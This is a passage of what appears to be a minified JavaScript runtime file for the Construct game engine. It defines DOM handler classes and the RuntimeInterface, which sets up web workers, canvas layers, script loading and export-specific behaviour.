'use strict';
(window.DOMHandler = class DOMHandler {
  constructor(iRuntime, componentId) {
    (this._iRuntime = iRuntime),
      (this._componentId = componentId),
      (this._hasTickCallback = !1),
      (this._tickCallback = () => this.Tick());
  }
  Attach() {}
  PostToRuntime(handler, data, dispatchOpts, transferables) {
    this._iRuntime.PostToRuntimeComponent(
      this._componentId,
      handler,
      data,
      dispatchOpts,
      transferables
    );
  }
  PostToRuntimeAsync(handler, data, dispatchOpts, transferables) {
    return this._iRuntime.PostToRuntimeComponentAsync(
      this._componentId,
      handler,
      data,
      dispatchOpts,
      transferables
    );
  }
  _PostToRuntimeMaybeSync(name, data, dispatchOpts) {
    this._iRuntime.UsesWorker()
      ? this.PostToRuntime(name, data, dispatchOpts)
      : this._iRuntime
          ._GetLocalRuntime()
          ._OnMessageFromDOM({
            type: 'event',
            component: this._componentId,
            handler: name,
            dispatchOpts: dispatchOpts || null,
            data: data,
            responseId: null,
          });
  }
  AddRuntimeMessageHandler(handler, func) {
    this._iRuntime.AddRuntimeComponentMessageHandler(
      this._componentId,
      handler,
      func
    );
  }
  AddRuntimeMessageHandlers(list) {
    for (const [handler, func] of list)
      this.AddRuntimeMessageHandler(handler, func);
  }
  GetRuntimeInterface() {
    return this._iRuntime;
  }
  GetComponentID() {
    return this._componentId;
  }
  _StartTicking() {
    this._hasTickCallback ||
      (this._iRuntime._AddRAFCallback(this._tickCallback),
      (this._hasTickCallback = !0));
  }
  _StopTicking() {
    this._hasTickCallback &&
      (this._iRuntime._RemoveRAFCallback(this._tickCallback),
      (this._hasTickCallback = !1));
  }
  Tick() {}
}),
  (window.RateLimiter = class RateLimiter {
    constructor(callback, interval) {
      (this._callback = callback),
        (this._interval = interval),
        (this._timerId = -1),
        (this._lastCallTime = -1 / 0),
        (this._timerCallFunc = () => this._OnTimer()),
        (this._ignoreReset = !1),
        (this._canRunImmediate = !1);
    }
    SetCanRunImmediate(c) {
      this._canRunImmediate = !!c;
    }
    Call() {
      if (-1 !== this._timerId) return;
      const nowTime = Date.now(),
        timeSinceLastCall = nowTime - this._lastCallTime,
        interval = this._interval;
      timeSinceLastCall >= interval && this._canRunImmediate
        ? ((this._lastCallTime = nowTime), this._RunCallback())
        : (this._timerId = self.setTimeout(
            this._timerCallFunc,
            Math.max(interval - timeSinceLastCall, 4)
          ));
    }
    _RunCallback() {
      (this._ignoreReset = !0), this._callback(), (this._ignoreReset = !1);
    }
    Reset() {
      this._ignoreReset ||
        (this._CancelTimer(), (this._lastCallTime = Date.now()));
    }
    _OnTimer() {
      (this._timerId = -1),
        (this._lastCallTime = Date.now()),
        this._RunCallback();
    }
    _CancelTimer() {
      -1 !== this._timerId &&
        (self.clearTimeout(this._timerId), (this._timerId = -1));
    }
    Release() {
      this._CancelTimer(),
        (this._callback = null),
        (this._timerCallFunc = null);
    }
  });
{
  class ElementState {
    constructor(elem) {
      (this._elem = elem),
        (this._hadFirstUpdate = !1),
        (this._isVisibleFlag = !0),
        (this._wantHtmlIndex = -1),
        (this._actualHtmlIndex = -1),
        (this._htmlZIndex = -1);
    }
    SetVisibleFlag(f) {
      this._isVisibleFlag = !!f;
    }
    GetVisibleFlag() {
      return this._isVisibleFlag;
    }
    HadFirstUpdate() {
      return this._hadFirstUpdate;
    }
    SetHadFirstUpdate() {
      this._hadFirstUpdate = !0;
    }
    GetWantHTMLIndex() {
      return this._wantHtmlIndex;
    }
    SetWantHTMLIndex(i) {
      this._wantHtmlIndex = i;
    }
    GetActualHTMLIndex() {
      return this._actualHtmlIndex;
    }
    SetActualHTMLIndex(i) {
      this._actualHtmlIndex = i;
    }
    SetHTMLZIndex(z) {
      this._htmlZIndex = z;
    }
    GetHTMLZIndex() {
      return this._htmlZIndex;
    }
    GetElement() {
      return this._elem;
    }
  }
  window.DOMElementHandler = class DOMElementHandler extends self.DOMHandler {
    constructor(iRuntime, componentId) {
      super(iRuntime, componentId),
        (this._elementMap = new Map()),
        (this._autoAttach = !0),
        this.AddRuntimeMessageHandlers([
          ['create', (e) => this._OnCreate(e)],
          ['destroy', (e) => this._OnDestroy(e)],
          ['set-visible', (e) => this._OnSetVisible(e)],
          ['update-position', (e) => this._OnUpdatePosition(e)],
          ['update-state', (e) => this._OnUpdateState(e)],
          ['focus', (e) => this._OnSetFocus(e)],
          ['set-css-style', (e) => this._OnSetCssStyle(e)],
          ['set-attribute', (e) => this._OnSetAttribute(e)],
          ['remove-attribute', (e) => this._OnRemoveAttribute(e)],
        ]),
        this.AddDOMElementMessageHandler('get-element', (elem) => elem);
    }
    SetAutoAttach(e) {
      this._autoAttach = !!e;
    }
    AddDOMElementMessageHandler(handler, func) {
      this.AddRuntimeMessageHandler(handler, (e) => {
        const elementId = e.elementId,
          elem = this.GetElementById(elementId);
        return func(elem, e);
      });
    }
    _OnCreate(e) {
      const elementId = e.elementId,
        elem = this.CreateElement(elementId, e),
        elementState = new ElementState(elem);
      this._elementMap.set(elementId, elementState),
        (elem.style.boxSizing = 'border-box'),
        (elem.style.display = 'none'),
        elementState.SetVisibleFlag(e.isVisible);
      const focusElem = this._GetFocusElement(elem);
      focusElem.addEventListener('focus', (e) => this._OnFocus(elementId)),
        focusElem.addEventListener('blur', (e) => this._OnBlur(elementId));
      const wantHtmlIndex = e.htmlIndex;
      if (
        (elementState.SetWantHTMLIndex(wantHtmlIndex),
        elementState.SetHTMLZIndex(e.htmlZIndex),
        this._autoAttach)
      ) {
        const actualHtmlIndex =
          this.GetRuntimeInterface().GetAvailableHTMLIndex(wantHtmlIndex);
        elementState.SetActualHTMLIndex(actualHtmlIndex);
        this.GetRuntimeInterface()
          .GetHTMLWrapElement(actualHtmlIndex)
          .appendChild(elem);
      }
    }
    CreateElement(elementId, e) {
      throw new Error('required override');
    }
    DestroyElement(elem) {}
    _OnDestroy(e) {
      const elementId = e.elementId,
        elem = this.GetElementById(elementId);
      this.DestroyElement(elem),
        this._autoAttach && elem.parentElement.removeChild(elem),
        this._elementMap.delete(elementId);
    }
    PostToRuntimeElement(handler, elementId, data) {
      data || (data = {}),
        (data.elementId = elementId),
        this.PostToRuntime(handler, data);
    }
    _PostToRuntimeElementMaybeSync(handler, elementId, data) {
      data || (data = {}),
        (data.elementId = elementId),
        this._PostToRuntimeMaybeSync(handler, data);
    }
    _OnSetVisible(e) {
      if (!this._autoAttach) return;
      const elemState = this._elementMap.get(e.elementId),
        elem = elemState.GetElement();
      elemState.HadFirstUpdate()
        ? (elem.style.display = e.isVisible ? '' : 'none')
        : elemState.SetVisibleFlag(e.isVisible);
    }
    _OnUpdatePosition(e) {
      if (!this._autoAttach) return;
      const elemState = this._elementMap.get(e.elementId),
        elem = elemState.GetElement(),
        iRuntime = this.GetRuntimeInterface();
      (elem.style.left = e.left + 'px'),
        (elem.style.top = e.top + 'px'),
        (elem.style.width = e.width + 'px'),
        (elem.style.height = e.height + 'px');
      const fontSize = e.fontSize;
      null !== fontSize && (elem.style.fontSize = fontSize + 'em');
      const wantHtmlIndex = e.htmlIndex;
      elemState.SetWantHTMLIndex(wantHtmlIndex);
      const actualHtmlIndex = iRuntime.GetAvailableHTMLIndex(wantHtmlIndex);
      if (actualHtmlIndex !== elemState.GetActualHTMLIndex()) {
        elem.remove();
        iRuntime.GetHTMLWrapElement(actualHtmlIndex).appendChild(elem),
          elemState.SetActualHTMLIndex(actualHtmlIndex),
          iRuntime._UpdateHTMLElementsZOrder();
      }
      const htmlZIndex = e.htmlZIndex;
      htmlZIndex !== elemState.GetHTMLZIndex() &&
        (elemState.SetHTMLZIndex(htmlZIndex),
        iRuntime._UpdateHTMLElementsZOrder()),
        elemState.HadFirstUpdate() ||
          (elemState.SetHadFirstUpdate(),
          elemState.GetVisibleFlag() && (elem.style.display = ''));
    }
    _OnHTMLLayersChanged() {
      if (this._autoAttach)
        for (const elemState of this._elementMap.values()) {
          const wantHtmlIndex =
              this.GetRuntimeInterface().GetAvailableHTMLIndex(
                elemState.GetWantHTMLIndex()
              ),
            actualHtmlIndex = elemState.GetActualHTMLIndex();
          if (
            -1 !== wantHtmlIndex &&
            -1 !== actualHtmlIndex &&
            wantHtmlIndex !== actualHtmlIndex
          ) {
            const elem = elemState.GetElement();
            elem.remove();
            this.GetRuntimeInterface()
              .GetHTMLWrapElement(wantHtmlIndex)
              .appendChild(elem),
              elemState.SetActualHTMLIndex(wantHtmlIndex);
          }
        }
    }
    _GetAllElementStatesForZOrderUpdate() {
      return this._autoAttach ? [...this._elementMap.values()] : null;
    }
    _OnUpdateState(e) {
      const elem = this.GetElementById(e.elementId);
      this.UpdateState(elem, e);
    }
    UpdateState(elem, e) {
      throw new Error('required override');
    }
    _GetFocusElement(elem) {
      return elem;
    }
    _OnFocus(elementId) {
      this.PostToRuntimeElement('elem-focused', elementId);
    }
    _OnBlur(elementId) {
      this.PostToRuntimeElement('elem-blurred', elementId);
    }
    _OnSetFocus(e) {
      const elem = this._GetFocusElement(this.GetElementById(e.elementId));
      e.focus ? elem.focus() : elem.blur();
    }
    _OnSetCssStyle(e) {
      const elem = this.GetElementById(e.elementId),
        prop = e.prop,
        val = e.val;
      prop.startsWith('--')
        ? elem.style.setProperty(prop, val)
        : (elem.style[prop] = val);
    }
    _OnSetAttribute(e) {
      this.GetElementById(e.elementId).setAttribute(e.name, e.val);
    }
    _OnRemoveAttribute(e) {
      this.GetElementById(e.elementId).removeAttribute(e.name);
    }
    GetElementById(elementId) {
      const elementState = this._elementMap.get(elementId);
      if (!elementState) throw new Error(`no element with id ${elementId}`);
      return elementState.GetElement();
    }
  };
}
{
  const isiOSLike = /(iphone|ipod|ipad|macos|macintosh|mac os x)/i.test(
      navigator.userAgent
    ),
    isAndroid = /android/i.test(navigator.userAgent),
    isSafari =
      /safari/i.test(navigator.userAgent) &&
      !/(chrome|chromium|edg\/|OPR\/|nwjs)/i.test(navigator.userAgent);
  let resolveCounter = 0;
  function AddScript(url) {
    const elem = document.createElement('script');
    return (
      (elem.async = !1),
      (elem.type = 'module'),
      url.isStringSrc
        ? new Promise((resolve) => {
            const resolveName = 'c3_resolve_' + resolveCounter;
            ++resolveCounter,
              (self[resolveName] = resolve),
              (elem.textContent = url.str + `\n\nself["${resolveName}"]();`),
              document.head.appendChild(elem);
          })
        : new Promise((resolve, reject) => {
            (elem.onload = resolve),
              (elem.onerror = reject),
              (elem.src = url),
              document.head.appendChild(elem);
          })
    );
  }
  async function CheckSupportsWorkerMode() {
    if (!navigator.userActivation || 'undefined' == typeof OffscreenCanvas)
      return !1;
    try {
      let isWorkerModuleSupported = !1;
      const workerScriptBlob = new Blob(
          [
            '\n\tself.addEventListener("message", () =>\n\t{\n\t\ttry {\n\t\t\tconst offscreenCanvas = new OffscreenCanvas(32, 32);\n\t\t\tconst gl = offscreenCanvas.getContext("webgl");\n\t\t\tself.postMessage(!!gl);\n\t\t}\n\t\tcatch (err)\n\t\t{\n\t\t\tconsole.warn("Feature detection worker error:", err);\n\t\t\tself.postMessage(false);\n\t\t}\n\t});',
          ],
          { type: 'text/javascript' }
        ),
        w = new Worker(URL.createObjectURL(workerScriptBlob), {
          get type() {
            isWorkerModuleSupported = !0;
          },
        }),
        result = await new Promise((resolve) => {
          w.addEventListener('message', (e) => {
            w.terminate(), resolve(e.data);
          }),
            w.postMessage('');
        });
      return isWorkerModuleSupported && result;
    } catch (err) {
      return console.warn('Error feature detecting worker mode: ', err), !1;
    }
  }
  let tmpAudio = new Audio();
  const supportedAudioFormats = {
    'audio/webm; codecs=opus': !!tmpAudio.canPlayType(
      'audio/webm; codecs=opus'
    ),
    'audio/ogg; codecs=opus': !!tmpAudio.canPlayType('audio/ogg; codecs=opus'),
    'audio/webm; codecs=vorbis': !!tmpAudio.canPlayType(
      'audio/webm; codecs=vorbis'
    ),
    'audio/ogg; codecs=vorbis': !!tmpAudio.canPlayType(
      'audio/ogg; codecs=vorbis'
    ),
    'audio/mp4': !!tmpAudio.canPlayType('audio/mp4'),
    'audio/mpeg': !!tmpAudio.canPlayType('audio/mpeg'),
  };
  async function BlobToString(blob) {
    const arrayBuffer = await BlobToArrayBuffer(blob);
    return new TextDecoder('utf-8').decode(arrayBuffer);
  }
  function BlobToArrayBuffer(blob) {
    return new Promise((resolve, reject) => {
      const fileReader = new FileReader();
      (fileReader.onload = (e) => resolve(e.target.result)),
        (fileReader.onerror = (err) => reject(err)),
        fileReader.readAsArrayBuffer(blob);
    });
  }
  tmpAudio = null;
  const queuedArrayBufferReads = [];
  let activeArrayBufferReads = 0;
  const MAX_ARRAYBUFFER_READS = 8;
  window.RealFile = window.File;
  const domHandlerClasses = [],
    runtimeEventHandlers = new Map(),
    pendingResponsePromises = new Map();
  let nextResponseId = 0;
  const runOnStartupFunctions = [];
  self.runOnStartup = function runOnStartup(f) {
    if ('function' != typeof f)
      throw new Error('runOnStartup called without a function');
    runOnStartupFunctions.push(f);
  };
  const WEBVIEW_EXPORT_TYPES = new Set([
    'cordova',
    'playable-ad',
    'instant-games',
  ]);
  function IsWebViewExportType(exportType) {
    return WEBVIEW_EXPORT_TYPES.has(exportType);
  }
  let isWrapperFullscreen = !1;
  window.RuntimeInterface = class RuntimeInterface {
    constructor(opts) {
      if (
        ((this._useWorker = opts.useWorker),
        (this._messageChannelPort = null),
        (this._runtimeBaseUrl = ''),
        (this._scriptFolder = opts.scriptFolder),
        (this._workerScriptURLs = {}),
        (this._worker = null),
        (this._localRuntime = null),
        (this._domHandlers = []),
        (this._runtimeDomHandler = null),
        (this._isFirstSizeUpdate = !0),
        (this._canvasLayers = []),
        (this._pendingRemoveElements = []),
        (this._pendingUpdateHTMLZOrder = !1),
        (this._updateHTMLZOrderRAFCallback = () =>
          this._DoUpdateHTMLElementsZOrder()),
        (this._isExportingToVideo = !1),
        (this._exportToVideoDuration = 0),
        (this._jobScheduler = null),
        (this._rafId = -1),
        (this._rafFunc = () => this._OnRAFCallback()),
        (this._rafCallbacks = new Set()),
        (this._wrapperInitResolve = null),
        (this._wrapperComponentIds = []),
        (this._exportType = opts.exportType),
        (this._isFileProtocol = 'file' === location.protocol.substr(0, 4)),
        ('playable-ad' !== this._exportType &&
          'instant-games' !== this._exportType) ||
          (this._useWorker = !1),
        isSafari && (this._useWorker = !1),
        'cordova' === this._exportType && this._useWorker && isAndroid)
      ) {
        const chromeVer = /Chrome\/(\d+)/i.exec(navigator.userAgent);
        (chromeVer && parseInt(chromeVer[1], 10) >= 90) ||
          (this._useWorker = !1);
      }
      this.IsAnyWebView2Wrapper()
        ? self.chrome.webview.addEventListener('message', (e) =>
            this._OnWrapperMessage(e.data)
          )
        : 'macos-wkwebview' === this._exportType &&
          (self.C3WrapperOnMessage = (msg) => this._OnWrapperMessage(msg)),
        (this._localFileBlobs = null),
        (this._localFileStrings = null),
        'html5' !== this._exportType ||
          window.isSecureContext ||
          console.warn(
            '[Construct] Warning: the browser indicates this is not a secure context. Some features may be unavailable. Use secure (HTTPS) hosting to ensure all features are available.'
          ),
        this.AddRuntimeComponentMessageHandler('canvas', 'update-size', (e) =>
          this._OnUpdateCanvasSize(e)
        ),
        this.AddRuntimeComponentMessageHandler(
          'canvas',
          'set-html-layer-count',
          (e) => this._OnSetHTMLLayerCount(e)
        ),
        this.AddRuntimeComponentMessageHandler(
          'canvas',
          'cleanup-html-layers',
          () => this._OnCleanUpHTMLLayers()
        ),
        this.AddRuntimeComponentMessageHandler(
          'runtime',
          'cordova-fetch-local-file',
          (e) => this._OnCordovaFetchLocalFile(e)
        ),
        this.AddRuntimeComponentMessageHandler(
          'runtime',
          'create-job-worker',
          (e) => this._OnCreateJobWorker(e)
        ),
        this.AddRuntimeComponentMessageHandler(
          'runtime',
          'send-wrapper-extension-message',
          (e) => this._OnSendWrapperExtensionMessage(e)
        ),
        'cordova' === this._exportType
          ? document.addEventListener('deviceready', () => this._Init(opts))
          : this._Init(opts);
    }
    Release() {
      this._CancelAnimationFrame(),
        this._messageChannelPort &&
          ((this._messageChannelPort.onmessage = null),
          (this._messageChannelPort = null)),
        this._worker && (this._worker.terminate(), (this._worker = null)),
        this._localRuntime &&
          (this._localRuntime.Release(), (this._localRuntime = null));
      for (const { canvas: canvas, htmlWrap: htmlWrap } of this._canvasLayers)
        canvas.remove(), htmlWrap.remove();
      this._canvasLayers.length = 0;
    }
    GetMainCanvas() {
      return this._canvasLayers[0].canvas;
    }
    GetAvailableHTMLIndex(index) {
      return Math.min(index, this._canvasLayers.length - 1);
    }
    GetHTMLWrapElement(index) {
      if (index < 0 || index >= this._canvasLayers.length)
        throw new RangeError('invalid canvas layer');
      return this._canvasLayers[index].htmlWrap;
    }
    GetRuntimeBaseURL() {
      return this._runtimeBaseUrl;
    }
    UsesWorker() {
      return this._useWorker;
    }
    GetExportType() {
      return this._exportType;
    }
    IsFileProtocol() {
      return this._isFileProtocol;
    }
    GetScriptFolder() {
      return this._scriptFolder;
    }
    IsiOSCordova() {
      return isiOSLike && 'cordova' === this._exportType;
    }
    IsiOSWebView() {
      const ua = navigator.userAgent;
      return (
        (isiOSLike && IsWebViewExportType(this._exportType)) ||
        navigator.standalone ||
        /crios\/|fxios\/|edgios\//i.test(ua)
      );
    }
    IsAndroid() {
      return isAndroid;
    }
    IsAndroidWebView() {
      return isAndroid && IsWebViewExportType(this._exportType);
    }
    IsWindowsWebView2() {
      return (
        'windows-webview2' === this._exportType ||
        !!(
          'preview' === this._exportType &&
          window.chrome &&
          window.chrome.webview &&
          window.chrome.webview.postMessage
        )
      );
    }
    IsAnyWebView2Wrapper() {
      return (
        this.IsWindowsWebView2() || 'xbox-uwp-webview2' === this._exportType
      );
    }
    async _Init(opts) {
      if (this._useWorker) {
        (await CheckSupportsWorkerMode()) || (this._useWorker = !1);
      }
      if ('macos-wkwebview' === this._exportType)
        this._SendWrapperMessage({ type: 'ready' });
      else if (this.IsAnyWebView2Wrapper()) {
        this._SetupWebView2Polyfills();
        const result = await this._InitWrapper();
        this._wrapperComponentIds = result.registeredComponentIds;
      }
      if ('playable-ad' === this._exportType) {
        (this._localFileBlobs = self.c3_base64files),
          (this._localFileStrings = {}),
          await this._ConvertDataUrisToBlobs();
        for (let i = 0, len = opts.engineScripts.length; i < len; ++i) {
          const src = opts.engineScripts[i];
          this._localFileStrings.hasOwnProperty(src)
            ? (opts.engineScripts[i] = {
                isStringSrc: !0,
                str: this._localFileStrings[src],
              })
            : this._localFileBlobs.hasOwnProperty(src) &&
              (opts.engineScripts[i] = URL.createObjectURL(
                this._localFileBlobs[src]
              ));
        }
        opts.workerDependencyScripts = [];
      }
      if (
        'nwjs' === this._exportType &&
        self.nw &&
        self.nw.App.manifest['c3-steam-mode']
      ) {
        let frameNum = 0;
        this._AddRAFCallback(() => {
          frameNum++,
            (document.body.style.opacity = frameNum % 2 == 0 ? '1' : '0.999');
        });
      }
      if (opts.runtimeBaseUrl) this._runtimeBaseUrl = opts.runtimeBaseUrl;
      else {
        const origin = location.origin;
        this._runtimeBaseUrl =
          ('null' === origin ? 'file:///' : origin) + location.pathname;
        const i = this._runtimeBaseUrl.lastIndexOf('/');
        -1 !== i &&
          (this._runtimeBaseUrl = this._runtimeBaseUrl.substr(0, i + 1));
      }
      opts.workerScripts && (this._workerScriptURLs = opts.workerScripts);
      const messageChannel = new MessageChannel();
      if (
        ((this._messageChannelPort = messageChannel.port1),
        (this._messageChannelPort.onmessage = (e) =>
          this._OnMessageFromRuntime(e.data)),
        window.c3_addPortMessageHandler &&
          window.c3_addPortMessageHandler((e) =>
            this._OnMessageFromDebugger(e)
          ),
        (this._jobScheduler = new self.JobSchedulerDOM(this)),
        await this._jobScheduler.Init(),
        'object' == typeof window.StatusBar && window.StatusBar.hide(),
        'object' == typeof window.AndroidFullScreen)
      )
        try {
          await new Promise((resolve, reject) => {
            window.AndroidFullScreen.immersiveMode(resolve, reject);
          });
        } catch (err) {
          console.error('Failed to enter Android immersive mode: ', err);
        }
      this._useWorker
        ? await this._InitWorker(opts, messageChannel.port2)
        : await this._InitDOM(opts, messageChannel.port2);
    }
    _GetWorkerURL(url) {
      let ret;
      return (
        (ret = this._workerScriptURLs.hasOwnProperty(url)
          ? this._workerScriptURLs[url]
          : url.endsWith('/workermain.js') &&
            this._workerScriptURLs.hasOwnProperty('workermain.js')
          ? this._workerScriptURLs['workermain.js']
          : 'playable-ad' === this._exportType &&
            this._localFileBlobs.hasOwnProperty(url)
          ? this._localFileBlobs[url]
          : url),
        ret instanceof Blob && (ret = URL.createObjectURL(ret)),
        ret
      );
    }
    async CreateWorker(url, baseUrl, workerOpts) {
      if (url.startsWith('blob:')) return new Worker(url, workerOpts);
      if ('cordova' === this._exportType && this._isFileProtocol) {
        let filePath = '';
        filePath = workerOpts.isC3MainWorker ? url : this._scriptFolder + url;
        const arrayBuffer = await this.CordovaFetchLocalFileAsArrayBuffer(
            filePath
          ),
          blob = new Blob([arrayBuffer], { type: 'application/javascript' });
        return new Worker(URL.createObjectURL(blob), workerOpts);
      }
      const absUrl = new URL(url, baseUrl);
      if (location.origin !== absUrl.origin) {
        const response = await fetch(absUrl);
        if (!response.ok) throw new Error('failed to fetch worker script');
        const blob = await response.blob();
        return new Worker(URL.createObjectURL(blob), workerOpts);
      }
      return new Worker(absUrl, workerOpts);
    }
    _GetWindowInnerWidth() {
      return Math.max(window.innerWidth, 1);
    }
    _GetWindowInnerHeight() {
      return Math.max(window.innerHeight, 1);
    }
    GetCssDisplayMode() {
      if (this.IsAnyWebView2Wrapper()) return 'standalone';
      const exportType = this.GetExportType();
      return new Set(['cordova', 'nwjs', 'macos-wkwebview']).has(exportType)
        ? 'standalone'
        : window.matchMedia('(display-mode: fullscreen)').matches
        ? 'fullscreen'
        : window.matchMedia('(display-mode: standalone)').matches
        ? 'standalone'
        : window.matchMedia('(display-mode: minimal-ui)').matches
        ? 'minimal-ui'
        : navigator.standalone
        ? 'standalone'
        : 'browser';
    }
    _GetCommonRuntimeOptions(opts) {
      return {
        runtimeBaseUrl: this._runtimeBaseUrl,
        previewUrl: location.href,
        windowInnerWidth: this._GetWindowInnerWidth(),
        windowInnerHeight: this._GetWindowInnerHeight(),
        cssDisplayMode: this.GetCssDisplayMode(),
        devicePixelRatio: window.devicePixelRatio,
        isFullscreen: RuntimeInterface.IsDocumentFullscreen(),
        projectData: opts.projectData,
        previewImageBlobs: window.cr_previewImageBlobs || this._localFileBlobs,
        previewProjectFileBlobs: window.cr_previewProjectFileBlobs,
        previewProjectFileSWUrls: window.cr_previewProjectFiles,
        swClientId: window.cr_swClientId || '',
        exportType: opts.exportType,
        isDebug: new URLSearchParams(self.location.search).has('debug'),
        ife: !!self.ife,
        jobScheduler: this._jobScheduler.GetPortData(),
        supportedAudioFormats: supportedAudioFormats,
        opusWasmScriptUrl:
          window.cr_opusWasmScriptUrl || this._scriptFolder + 'opus.wasm.js',
        opusWasmBinaryUrl:
          window.cr_opusWasmBinaryUrl || this._scriptFolder + 'opus.wasm.wasm',
        isFileProtocol: this._isFileProtocol,
        isiOSCordova: this.IsiOSCordova(),
        isiOSWebView: this.IsiOSWebView(),
        isWindowsWebView2: this.IsWindowsWebView2(),
        isAnyWebView2Wrapper: this.IsAnyWebView2Wrapper(),
        wrapperComponentIds: this._wrapperComponentIds,
        isFBInstantAvailable: void 0 !== self.FBInstant,
      };
    }
    async _InitWorker(opts, port2) {
      const workerMainUrl = this._GetWorkerURL(opts.workerMainUrl);
      'preview' === this._exportType
        ? ((this._worker = new Worker('previewworker.js', {
            type: 'module',
            name: 'Runtime',
          })),
          await new Promise((resolve, reject) => {
            const messageHandler = (e) => {
              this._worker.removeEventListener('message', messageHandler),
                e.data && 'ok' === e.data.type ? resolve() : reject();
            };
            this._worker.addEventListener('message', messageHandler),
              this._worker.postMessage({
                type: 'construct-worker-init',
                import: new URL(workerMainUrl, this._runtimeBaseUrl).toString(),
              });
          }))
        : (this._worker = await this.CreateWorker(
            workerMainUrl,
            this._runtimeBaseUrl,
            { type: 'module', name: 'Runtime', isC3MainWorker: !0 }
          ));
      const canvas = document.createElement('canvas');
      canvas.style.display = 'none';
      const offscreenCanvas = canvas.transferControlToOffscreen();
      document.body.appendChild(canvas);
      const htmlWrap = document.createElement('div');
      (htmlWrap.className = 'c3htmlwrap'),
        document.body.appendChild(htmlWrap),
        this._canvasLayers.push({ canvas: canvas, htmlWrap: htmlWrap }),
        (window.c3canvas = canvas),
        self.C3_InsertHTMLPlaceholders && self.C3_InsertHTMLPlaceholders();
      let workerDependencyScripts = opts.workerDependencyScripts || [],
        engineScripts = opts.engineScripts;
      if (
        ((workerDependencyScripts = await Promise.all(
          workerDependencyScripts.map((url) =>
            this._MaybeGetCordovaScriptURL(url)
          )
        )),
        (engineScripts = await Promise.all(
          engineScripts.map((url) => this._MaybeGetCordovaScriptURL(url))
        )),
        'cordova' === this._exportType)
      )
        for (let i = 0, len = opts.projectScripts.length; i < len; ++i) {
          const info = opts.projectScripts[i],
            originalUrl = info[0];
          (originalUrl === opts.mainProjectScript ||
            'scriptsInEvents.js' === originalUrl ||
            originalUrl.endsWith('/scriptsInEvents.js')) &&
            (info[1] = await this._MaybeGetCordovaScriptURL(originalUrl));
        }
      this._worker.postMessage(
        Object.assign(this._GetCommonRuntimeOptions(opts), {
          type: 'init-runtime',
          isInWorker: !0,
          messagePort: port2,
          canvas: offscreenCanvas,
          workerDependencyScripts: workerDependencyScripts,
          engineScripts: engineScripts,
          projectScripts: opts.projectScripts,
          mainProjectScript: opts.mainProjectScript,
          projectScriptsStatus: self.C3_ProjectScriptsStatus,
        }),
        [port2, offscreenCanvas, ...this._jobScheduler.GetPortTransferables()]
      ),
        (this._domHandlers = domHandlerClasses.map((C) => new C(this))),
        this._FindRuntimeDOMHandler(),
        this._runtimeDomHandler._AddDefaultCanvasEventHandlers(canvas),
        this._runtimeDomHandler._AddDefaultHTMLWrapEventHandlers(htmlWrap),
        this._runtimeDomHandler._EnableWindowResizeEvent(),
        (self.c3_callFunction = (name, params) =>
          this._runtimeDomHandler._InvokeFunctionFromJS(name, params)),
        'preview' === this._exportType &&
          (self.goToLastErrorScript = () =>
            this.PostToRuntimeComponent('runtime', 'go-to-last-error-script'));
    }
    async _InitDOM(opts, port2) {
      const canvas = document.createElement('canvas');
      (canvas.style.display = 'none'), document.body.appendChild(canvas);
      const htmlWrap = document.createElement('div');
      (htmlWrap.className = 'c3htmlwrap'),
        document.body.appendChild(htmlWrap),
        this._canvasLayers.push({ canvas: canvas, htmlWrap: htmlWrap }),
        (window.c3canvas = canvas),
        self.C3_InsertHTMLPlaceholders && self.C3_InsertHTMLPlaceholders(),
        (this._domHandlers = domHandlerClasses.map((C) => new C(this))),
        this._FindRuntimeDOMHandler(),
        this._runtimeDomHandler._AddDefaultCanvasEventHandlers(canvas),
        this._runtimeDomHandler._AddDefaultHTMLWrapEventHandlers(htmlWrap);
      let engineScripts = opts.engineScripts.map((url) =>
        'string' == typeof url
          ? new URL(url, this._runtimeBaseUrl).toString()
          : url
      );
      if (Array.isArray(opts.workerDependencyScripts)) {
        const workerDependencyScripts = [...opts.workerDependencyScripts].map(
          (s) => (s instanceof Blob ? URL.createObjectURL(s) : s)
        );
        engineScripts.unshift(...workerDependencyScripts);
      }
      (engineScripts = await Promise.all(
        engineScripts.map((url) => this._MaybeGetCordovaScriptURL(url))
      )),
        await Promise.all(engineScripts.map((url) => AddScript(url)));
      const scriptsStatus = self.C3_ProjectScriptsStatus,
        mainProjectScript = opts.mainProjectScript,
        allProjectScripts = opts.projectScripts;
      for (let [originalUrl, loadUrl] of allProjectScripts)
        if (
          (loadUrl || (loadUrl = originalUrl),
          originalUrl === mainProjectScript)
        )
          try {
            (loadUrl = await this._MaybeGetCordovaScriptURL(loadUrl)),
              await AddScript(loadUrl),
              'preview' !== this._exportType ||
                scriptsStatus[originalUrl] ||
                this._ReportProjectMainScriptError(
                  originalUrl,
                  'main script did not run to completion'
                );
          } catch (err) {
            this._ReportProjectMainScriptError(originalUrl, err);
          }
        else
          ('scriptsInEvents.js' === originalUrl ||
            originalUrl.endsWith('/scriptsInEvents.js')) &&
            ((loadUrl = await this._MaybeGetCordovaScriptURL(loadUrl)),
            await AddScript(loadUrl));
      if (
        'preview' === this._exportType &&
        'object' != typeof self.C3.ScriptsInEvents
      ) {
        this._RemoveLoadingMessage();
        const msg =
          'Failed to load JavaScript code used in events. Check all your JavaScript code has valid syntax.';
        return console.error('[C3 runtime] ' + msg), void alert(msg);
      }
      const runtimeOpts = Object.assign(this._GetCommonRuntimeOptions(opts), {
        isInWorker: !1,
        messagePort: port2,
        canvas: canvas,
        runOnStartupFunctions: runOnStartupFunctions,
      });
      this._runtimeDomHandler._EnableWindowResizeEvent(),
        this._OnBeforeCreateRuntime(),
        (this._localRuntime = self.C3_CreateRuntime(runtimeOpts)),
        await self.C3_InitRuntime(this._localRuntime, runtimeOpts);
    }
    _ReportProjectMainScriptError(url, err) {
      this._RemoveLoadingMessage(),
        console.error(
          `[Preview] Failed to load project main script (${url}): `,
          err
        ),
        alert(
          `Failed to load project main script (${url}). Check all your JavaScript code has valid syntax. Press F12 and check the console for error details.`
        );
    }
    _OnBeforeCreateRuntime() {
      this._RemoveLoadingMessage();
    }
    _RemoveLoadingMessage() {
      const loadingElem = window.cr_previewLoadingElem;
      loadingElem &&
        (loadingElem.parentElement.removeChild(loadingElem),
        (window.cr_previewLoadingElem = null));
    }
    async _OnCreateJobWorker(e) {
      const outputPort = await this._jobScheduler._CreateJobWorker();
      return { outputPort: outputPort, transferables: [outputPort] };
    }
    _OnUpdateCanvasSize(e) {
      if (this.IsExportingToVideo()) return;
      const widthPx = e.styleWidth + 'px',
        heightPx = e.styleHeight + 'px',
        leftPx = e.marginLeft + 'px',
        topPx = e.marginTop + 'px';
